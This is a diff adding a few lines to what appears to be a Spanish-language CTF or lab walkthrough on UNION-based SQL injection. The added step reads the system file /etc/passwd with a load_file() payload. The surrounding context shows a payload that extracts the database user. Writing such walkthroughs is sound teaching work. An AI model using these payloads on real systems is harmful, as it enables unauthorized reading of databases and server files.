@@ -58,7 +58,12 @@ union select 1,2,user(),4,5,6,7-- -
 ```
 ![Resultado de Nmap](IMG/user.png)
 
+Tambien podriamos leer archivos internos de la maquina como el /etc/passwd
 
+```
+union select 1,2,load_file("/etc/passwd"),4,5,6,7-- -
+```
+![Resultado de Nmap](IMG/file.png)
 
 
 
